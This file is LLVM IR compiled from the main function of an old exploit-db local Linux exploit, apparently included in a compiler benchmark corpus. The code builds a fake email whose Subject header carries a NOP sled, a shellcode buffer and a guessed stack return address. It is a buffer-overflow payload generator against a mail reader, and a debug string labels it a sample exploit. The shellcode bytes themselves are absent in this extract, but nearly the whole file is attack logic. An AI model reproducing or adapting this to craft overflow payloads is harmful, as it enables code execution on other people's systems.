; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19249.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19249.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [51 x i8] c"From pop3@192.134.192.112 Wed Dec 2 19:27:57 1998\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Date: Wed, 25 Dec 1998 00:00:00 +0000\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"From: 0z0n3 <friend@localhost>\0A\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"Subject: \00", align 1
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@ESP = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [101 x i8] c"sample exploit by XSFX@iname.com\0ADEBUG: %d NOPs\0ADEBUG: using %#x (getesp()%+d) as shellcode address\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [52 x i8] c"Message-Id: <199812021827.TAA23112@003.dyn.ml.org>\0A\00", align 1
@.str.6 = private unnamed_addr constant [34 x i8] c"To: \22dear user\22 <you@domain.com>\0A\00", align 1
@.str.7 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.8 = private unnamed_addr constant [58 x i8] c"hello ! please reply, i'm not sure my email box is ok :(\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %9 = call i32 @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str, i64 0, i64 0))
  %10 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %13

13:                                               ; preds = %24, %2
  %14 = load i32, i32* %7, align 4
  %15 = load i8*, i8** @shellcode, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = sub nsw i32 204, %16
  %18 = icmp slt i32 %14, %17
  br i1 %18, label %19, label %27

19:                                               ; preds = %13
  %20 = load i32, i32* @NOP, align 4
  %21 = call i32 @putchar(i32 %20)
  %22 = load i32, i32* %8, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %8, align 4
  br label %24

24:                                               ; preds = %19
  %25 = load i32, i32* %7, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %7, align 4
  br label %13

27:                                               ; preds = %13
  %28 = load i8*, i8** @shellcode, align 8
  %29 = call i32 @printf(i8* %28)
  %30 = load i64, i64* @ESP, align 8
  store i64 %30, i64* %6, align 8
  %31 = load i32, i32* @stderr, align 4
  %32 = load i32, i32* %8, align 4
  %33 = load i64, i64* %6, align 8
  %34 = load i64, i64* %6, align 8
  %35 = call i32 (...) @getesp()
  %36 = sext i32 %35 to i64
  %37 = sub i64 %34, %36
  %38 = trunc i64 %37 to i32
  %39 = call i32 @fprintf(i32 %31, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.4, i64 0, i64 0), i32 %32, i64 %33, i32 %38)
  %40 = load i32, i32* @stdout, align 4
  %41 = call i32 @fwrite(i64* %6, i32 4, i32 1, i32 %40)
  %42 = load i32, i32* @stdout, align 4
  %43 = call i32 @putc(i8 signext 10, i32 %42)
  %44 = call i32 @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.5, i64 0, i64 0))
  %45 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  %46 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %47 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.8, i64 0, i64 0))
  %48 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0))
  %49 = load i32, i32* %3, align 4
  ret i32 %49
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @putchar(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32, i64, i32) #1

declare dso_local i32 @getesp(...) #1

declare dso_local i32 @fwrite(i64*, i32, i32, i32) #1

declare dso_local i32 @putc(i8 signext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
